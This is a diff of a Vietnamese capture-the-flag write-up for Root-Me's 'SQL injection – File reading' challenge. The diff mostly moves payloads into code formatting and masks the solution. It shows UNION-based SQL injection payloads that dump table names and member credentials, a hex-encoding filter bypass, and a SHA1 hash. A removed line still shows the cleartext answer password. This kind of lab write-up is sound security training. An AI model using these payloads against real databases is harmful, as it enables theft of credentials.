@@ -1,6 +1,4 @@
-# WRITE UP
-
-**Challenge:** [SQL injection – File reading](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-file-reading)
+# [SQL injection – File reading](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-file-reading)
 
 <img src="./media/image1.png" style="width:6.5in;height:2.16458in" alt="Graphical user interface, text, application Description automatically generated" />
 
@@ -18,21 +16,19 @@ Sau một hồi fuzz, ta đã tìm được các bảng của dtb:
 
 <img src="./media/image4.png" style="width:6.5in;height:2.86944in" alt="Graphical user interface, text Description automatically generated" />
 
-*id=1+and+0=1+union+select+group\_concat(table\_name),1,1,1+from+information\_schema.tables--+-*
+Payload: `id=1+and+0=1+union+select+group_concat(table_name),1,1,1+from+information_schema.tables--+-`
 
-Ta thấy, có table ‘member’, tiến hành tìm column của nó. Tuy nhiên, dtb đã filter mất tiêu:
+Ta thấy, có table `‘member’`, tiến hành tìm column của nó. Tuy nhiên, dtb đã filter mất tiêu:
 
 <img src="./media/image5.png" style="width:6.5in;height:2.83819in" alt="Graphical user interface, text, email Description automatically generated" />
 
-Thử convert ‘member’ hex value: **0x6D656D626572**
+Thử convert `‘member’` hex value: `0x6D656D626572`
 
 <img src="./media/image6.png" style="width:6.5in;height:2.87917in" alt="Graphical user interface, text, email Description automatically generated" />
 
--   member\_id,member\_login,member\_password,member\_email
+-   `member_id,member_login,member_password,member_email`
 
-Tìm password thôi. Tuy nhiên, đến lúc này database k constaint table\_name nữa, ta có payload:
-
-*id=1+and+0=1+union+select+member\_login,member\_password,1,1+from+member*
+Tìm password thôi. Tuy nhiên, đến lúc này database k constaint table_name nữa, ta có payload: `id=1+and+0=1+union+select+member_login,member_password,1,1+from+member`
 
 <img src="./media/image7.png" style="width:6.5in;height:2.70417in" alt="Graphical user interface, text, application, email Description automatically generated" />
 
@@ -50,11 +46,11 @@ Giờ thì hiểu nó rồi, ta sử dụng python để stringxor ngược lạ
 
 <img src="./media/image11.png" style="width:6.5in;height:3.33611in" alt="A screenshot of a computer Description automatically generated with medium confidence" />
 
--   SHA1 password: **77be4fc97f77f5f48308942bb6e32aacabed9cef**
+-   SHA1 password: `77be4fc97f77f5f48308942bb6e32aacabed9cef`
 
 <img src="./media/image12.png" style="width:6.14672in;height:2.72006in" alt="Graphical user interface, text, website Description automatically generated" />
 
--   Password: **superpassword**
+-   Password: `supe*********word`
 
 <img src="./media/image13.png" style="width:6.5in;height:2.14722in" alt="Graphical user interface, text, application Description automatically generated" />
 
